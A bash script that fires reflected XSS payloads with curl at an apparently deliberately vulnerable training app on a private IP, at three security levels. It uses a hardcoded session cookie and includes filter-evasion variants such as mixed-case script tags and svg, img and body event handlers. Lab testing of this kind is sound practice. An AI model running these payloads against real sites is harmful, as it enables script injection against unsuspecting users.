CK='PHPSESSID=37451a4e56484ab7fe32cdd9b205d7ed'
BASE='http://10.31.0.87:3000'
mkdir -p evidence/xss

xget(){ L=$1; shift; curl -s -b "$CK; security=$L" "$BASE/vulnerabilities/xss_r/" -G --data-urlencode "name=$1" | grep -oE '<pre>.*</pre>|Hello.*</p>' | sed 's/<pre>//;s/<\/pre>//' | head -c 900; echo " <<== [$L] name=[$1]"; }

# LOW
xget low '<script>alert(1)</script>'
xget low '<svg onload=alert(1)>'
# MEDIUM
xget medium '<script>alert(1)</script>'
xget medium '<ScRiPt>alert(1)</ScRiPt>'
xget medium '<svg onload=alert(1)>'
xget medium '"><ScRiPt>alert(1)</ScRiPt>'
# HIGH
xget high '<script>alert(1)</script>'
xget high '<ScRiPt>alert(1)</ScRiPt>'
xget high '<svg onload=alert(1)>'
xget high '<img src=x onerror=alert(1)>'
xget high '<body onload=alert(1)>'
